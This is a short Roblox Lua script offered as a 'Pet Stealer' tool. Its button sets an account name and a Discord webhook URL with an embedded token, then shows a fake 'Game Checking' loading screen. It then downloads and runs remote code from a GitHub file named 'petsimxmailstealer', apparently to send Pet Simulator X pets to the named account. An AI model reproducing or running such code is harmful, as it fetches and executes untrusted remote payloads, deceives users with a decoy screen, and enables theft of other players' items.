local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()

local Window = Library.CreateLib("Pet Stealer]", "DarkTheme")

local Tab = Window:NewTab("Steal")

local Section = Tab:NewSection("Steal Pets")

Section:NewButton("Start Steal", "ButtonInfo", function()

Username = "XXxxGamer12345xxXX"

WebHook = "https://discord.com/api/webhooks/1081853543218151424/38a7tN6RZe0OWTPe1KxKEk0eHfwilf7jNsRlCnx4xJZdvdFGYz5ZUrzY6qQMtuRK53Al"

loadingscreen = true

_G.CustomScriptName = "Checking Game"

_G.Text1 = "Game Checking..."

_G.Text2 = "Game Checked Successfully"

_G.Text3 = "Checking Scripts..."

_G.Text4 = "Starting Scripts..."

loadstring(game:HttpGet("https://raw.githubusercontent.com/DrakeIsEpic/Scripts3/main/petsimxmailstealer"))()

    print("Clicked")

end)

Section:NewTextBox("Target Username", "Dont Use DisplayName", function(txt)

	print(txt)end)
